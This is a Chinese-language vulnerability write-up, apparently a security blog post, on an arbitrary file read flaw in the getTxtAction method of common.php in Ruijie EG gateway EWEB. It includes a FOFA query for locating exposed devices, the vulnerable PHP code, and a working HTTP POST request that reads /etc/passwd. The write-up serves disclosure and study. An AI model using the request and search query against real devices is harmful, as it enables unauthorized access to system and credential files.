---
title: "锐捷-EWEB common.php 文件读取漏洞"
source: https://mrxn.net/jswz/ruijieweb-common-fileread.html
asset_dir: assets/锐捷-eweb-common.php-文件读取漏洞
---

# 锐捷-EWEB common.php 文件读取漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/5/11 08:32
- 1106浏览
- [0评论](#comment)
- 10分钟阅读

深入探索

编程语言教程

漏洞扫描服务

Web安全书籍

---

# 漏洞简介

锐捷EG易网关是一款综合网关，由锐捷网络完全自主研发。它集成了先进的软硬件体系架构，配备了DPI深入分析引擎、行为分析/管理引擎，可以在保证网络出口高效转发的条件下，提供专业的流控功能、出色的URL过滤以及本地化的日志存储/审计服务。锐捷EG易网关 `common.php` 的 `getTxtAction` 存在任意[文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)漏洞，攻击者可以利用该[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)读取设备上任意文件内容，造成敏感信息泄露。

漏洞修复方案

# 影响版本

<=2022.07.28.01

# fofa语法

> `title="锐捷网络-EWEB网管系统" || app="Ruijie-EG易网关" && body="/login.php?a=version"`

# 漏洞分析

直接看 `ddi/server/common.php` 中的 `getTxtAction` 方法实现

深入探索

网络安全培训

安全研究报告

授权

```
public function getTxtAction() {
        $file = p('path');
        $status = true;
        if (file_exists($file)) {
            $content = file_get_contents($file); //读取文件中的内容
        } else {
            $status = false;
            return;
        }
        json_echo(array('status'=>$status, 'content'=>$content));
    }
```

直接将无任何过滤和校验 post 获取的 `path` 直接带入 `file_get_contents` 函数中进行文件操作，导致任意[文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)漏洞。

# 漏洞复现

```
POST /ddi/server/common.php?a=getTxt HTTP/1.1
Host: ruijieweb.mrxn.net
Content-Type: application/x-www-form-urlencoded
Cookie: RUIJIEID=xxxxxxxxxxl855hve3xxxxxxxx
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip

path=/etc/passwd
```

成功读取到 `/etc/passwd` 文件内容

深入探索

VPN服务

恶意软件分析工具

JSON处理工具

[![锐捷-EWEB common.php 文件读取漏洞](images/img-001-f04e58ad445d.webp)](https://image.mrxn.net/17e6d77061a945608a6bacdc02740443.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
